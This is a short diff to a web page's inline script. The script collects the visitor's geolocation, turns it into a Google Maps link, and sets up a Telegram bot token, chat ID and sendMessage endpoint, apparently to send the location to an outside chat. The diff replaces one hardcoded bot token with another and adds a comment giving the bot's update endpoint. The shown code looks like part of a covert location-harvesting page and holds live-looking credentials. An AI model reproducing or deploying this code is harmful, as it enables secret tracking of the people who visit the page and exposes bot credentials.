@@ -74,14 +74,14 @@
 <script>
 
     let locationData = null;
-
+/*HTTPS://API.TELEGRAM.ORG/BOT<TOKEN>/GETUPDATES*/
 navigator.geolocation.getCurrentPosition((position) => {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
     locationData = `https://www.google.com/maps?q=${lat},${lon}`;
 });
-    const TOKEN = "8897581778:AAF1NB4VES9WnS-9N9FMDPH3-nxtvZ0-W8I";
+    const TOKEN = "8838203713:AAFux6rxaJIvCJGwgkzCZ1SamSt_aXQXGGU";
     const CHAT_ID = "8830461614"; 
     const CHAT_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
